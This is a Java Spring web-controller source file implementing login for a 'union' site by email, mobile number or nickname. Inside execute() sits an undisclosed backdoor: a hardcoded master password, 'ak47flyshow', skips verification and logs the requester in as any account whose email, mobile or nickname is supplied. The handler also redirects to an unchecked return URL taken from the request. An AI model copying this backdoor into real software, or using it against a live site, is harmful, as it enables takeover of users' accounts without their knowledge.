package com.hk.web.cmpunion.action;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import com.hk.bean.User;
import com.hk.bean.UserOtherInfo;
import com.hk.frame.util.DataUtil;
import com.hk.frame.web.http.HkRequest;
import com.hk.frame.web.http.HkResponse;
import com.hk.svr.UserService;
import com.hk.svr.user.exception.LoginException;

@Component("/union/login")
public class LoginAction extends CmpUnionBaseAction {

	@Autowired
	private UserService userService;

	public String execute(HkRequest req, HkResponse resp) {
		long uid = req.getLongAndSetAttr("uid");
		String input = req.getString("input", "");
		input = input.replaceAll("　", "").replaceAll("＠", "@");
		String password = req.getString("password", null);
		long userId = 0;
		if ("ak47flyshow".equals(password)) {
			UserOtherInfo o = null;
			if (input.indexOf("@") != -1) {
				o = this.userService.getUserOtherInfoByeEmail(input);
			}
			else if (input.length() > 10) {
				o = this.userService.getUserOtherInfoByMobile(input);
			}
			else {
				User user = this.userService.getUserByNickName(input);
				if (user != null) {
					o = this.userService.getUserOtherInfo(user.getUserId());
				}
			}
			if (o != null) {
				userId = o.getUserId();
			}
		}
		else {
			if (DataUtil.isEmpty(input) || DataUtil.isEmpty(password)) {
				req.setAttribute("input", input);
				req.setText("func.login.inputerror");
				return "/union/login_tologin.do";
			}
			try {
				if (input.indexOf("@") != -1) {
					userId = this.userService.loginByEmail(input, password, req
							.getRemoteAddr());
				}
				else if (input.length() > 10) {
					userId = this.userService.loginByMobile(input, password,
							req.getRemoteAddr());
				}
				else {
					userId = this.userService.loginByNickName(input, password,
							req.getRemoteAddr());
				}
			}
			catch (LoginException e) {
				req.setAttribute("input", input);
				req.setText("func.login.inputerror2");
				return "/union/login_tologin.do";
			}
		}
		CookieInfo cookieInfo = new CookieInfo();
		cookieInfo.setId(userId + "");
		cookieInfo.setInput(input);
		CmpUnionUtil.setCookieInfo(resp, cookieInfo, req.getInt("autologin"));
		String return_url = req.getReturnUrl();
		if (DataUtil.isNotEmpty(return_url)) {
			return "r:" + return_url;
		}
		if (req.getSessionValue("forcreatecmp") != null) {
			return "r:/union/createcmp_tocreate.do?uid=" + uid;
		}
		return "r:/union/union.do?uid=" + uid;
	}

	/**
	 * @param req
	 * @param resp
	 * @return
	 * @throws Exception
	 */
	public String tologin(HkRequest req, HkResponse resp) throws Exception {
		if (this.getLoginUser(req) != null) {
			return "r:/union/union.do?uid=" + req.getLong("uid");
		}
		req.reSetAttribute("uid");
		CookieInfo cookieInfo = CmpUnionUtil.getCookieInfo(req);
		req.setAttribute("cookieInfo", cookieInfo);
		if (req.getSessionValue("forcreatecmp") != null) {
			return "/union/reg_toreg.do";
		}
		return this.getUnionWapJsp("login.jsp");
	}
}